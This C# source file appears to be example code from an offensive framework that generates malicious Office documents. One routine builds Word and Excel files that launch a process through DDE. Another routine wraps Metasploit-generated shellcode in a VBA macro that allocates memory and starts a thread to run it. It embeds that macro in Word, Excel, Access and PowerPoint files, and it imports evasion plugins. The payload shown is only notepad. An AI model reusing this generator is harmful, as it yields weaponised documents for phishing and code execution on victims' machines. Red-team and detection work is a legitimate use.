using System;
using System.Collections.Generic;
using System.Text;
using System.IO;

using MyWarez.Base;
using MyWarez.Core;
using MyWarez.Payloads;
using MyWarez.Plugins.Yasm;
using MyWarez.Plugins.Msvc;
using MyWarez.Plugins.Htmlmth;
using MyWarez.Plugins.GoDevTool;
using MyWarez.Plugins.CCxxEvasions;
using MyWarez.Plugins.Metasploit;
using MyWarez.Plugins.MacroPack;
using MyWarez.Plugins.OfficeDocumentEvasions;
using MyWarez.Plugins.PyInstaller;
using MyWarez.Plugins.GoBuild;
using MyWarez.Plugins.Donut;

namespace Examples
{
    public static partial class AttackExamples
    {
        // Office DDE Example
        private static IAttack OfficeDdeExample()
        {
            var samplesOutput = new SamplesOutput();
            var attackName = "OfficeDde";
            var attack = new Attack(new IOutput[] {
                samplesOutput,
            }, name: attackName);

            var cmdline = new Tonsil.Processes.CmdLine() { image = @"notepad", arguments = new string[] { } };
            var process = new Tonsil.Processes.Process(cmdline);
            var processList = new ProcessList(new[] { process });

            var wordDde = new WordDDE(processList);
            var wordDdeFilename = "WordDDE" + "." + wordDde.Extension;
            samplesOutput.Add(wordDdeFilename, wordDde);

            var excelDde = new ExcelDDE(processList);
            var excelDdeFilename = "ExcelDDE" + "." + excelDde.Extension;
            samplesOutput.Add(excelDdeFilename, excelDde);

            attack.Generate();
            return attack;
        }

        // Office VBAMacro Example
        private static IAttack OfficeVbaMacroExample()
        {
            var samplesOutput = new SamplesOutput();
            var attackName = "OfficeVbaMacro";
            var attack = new Attack(new IOutput[] {
                samplesOutput,
            }, name: attackName);

            var shellcodeBytes = MetasploitPayloadFactory.Generate(format: "raw", payload: "windows/exec", options: "EXITFUNC=thread CMD=notepad");
            // Most installs of Microsft Office are 32 bit
            var shellcode = new ShellcodeX86(shellcodeBytes);
            // VbaMacro that uses VirtualAlloc + RtlMoveMemory + CreateThread to execute shellcode
            var vbaMacro = new ShellcodeVbaMacro(shellcode);

            var wordVbaMacro = new WordVBAMacro(vbaMacro);
            var wordVbaMacroFilename = "WordVbaMacro" + "." + wordVbaMacro.Extension;
            samplesOutput.Add(wordVbaMacroFilename, wordVbaMacro);

            var excelVbaMacro = new ExcelVBAMacro(vbaMacro);
            var excelVbaMacroFilename = "ExcelVbaMacro" + "." + excelVbaMacro.Extension;
            samplesOutput.Add(excelVbaMacroFilename, excelVbaMacro);

            var accessVbaMacro = new AccessVBAMacro(vbaMacro);
            var accessVbaMacroFilename = "AccessVbaMacro" + "." + accessVbaMacro.Extension;
            samplesOutput.Add(accessVbaMacroFilename, accessVbaMacro);

            var powerPointVbaMacro = new PowerPointVBAMacro(vbaMacro);
            var powerPointVbaMacroFilename = "PowerPointVbaMacro" + "." + powerPointVbaMacro.Extension;
            samplesOutput.Add(powerPointVbaMacroFilename, powerPointVbaMacro);

            attack.Generate();
            return attack;
        }
    }
}
